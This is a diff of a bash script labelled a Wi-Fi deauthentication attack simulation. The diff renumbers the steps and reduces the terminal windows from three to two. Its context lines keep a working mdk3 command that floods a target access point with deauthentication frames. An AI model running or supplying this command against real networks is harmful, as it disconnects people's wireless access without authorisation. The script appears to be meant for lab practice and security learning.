@@ -1,5 +1,5 @@
 #!/bin/bash
-# Deauthentication Attack Step 3: Perform a Wi-Fi deauthentication attack on a WAP using mdk3
+# Deauthentication Attack Step 2: Perform a Wi-Fi deauthentication attack on a WAP using mdk3
 # Dependencies:
 # - https://salsa.debian.org/pkg-security-team/mdk3
 # - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
@@ -13,13 +13,12 @@ YELLOW="\e[0;33m"
 NORMAL="\e[0m"
 
 echo -e "${BLUE}${BOLD}*** Wi-Fi Deauthentication Attack Simulation Using Arch Linux ***${NORMAL}"
-echo -e "${YELLOW}=== Perform Deauthentication Attack Step 3: Attack ===${NORMAL}\n"
+echo -e "${YELLOW}=== Perform Deauthentication Attack Step 2: Attack ===${NORMAL}\n"
 
-# Three terminal windows are required for the attack, notify the user
-echo -e "Three terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
-echo -e "1. Display the WAP that will be attacked"
-echo -e "2. Capture data traffic from the WAP into a file"
-echo -e "${GREEN}${BOLD}3. Perform the deauthentication attack${NORMAL}"
+# Two terminal windows are required for the attack, notify the user
+echo -e "Two terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
+echo -e "1. Display the WAP that will be attacked & capture data traffic from it into files"
+echo -e "${GREEN}${BOLD}2. Perform the deauthentication attack${NORMAL}"
 echo -e
 
 # Find the names of the wireless network interface controllers (WNICs)
@@ -66,4 +65,4 @@ echo -e
 sudo mdk3 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
 echo -e
 
-echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}.${NORMAL}"
+echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}${GREEN}.${NORMAL}"
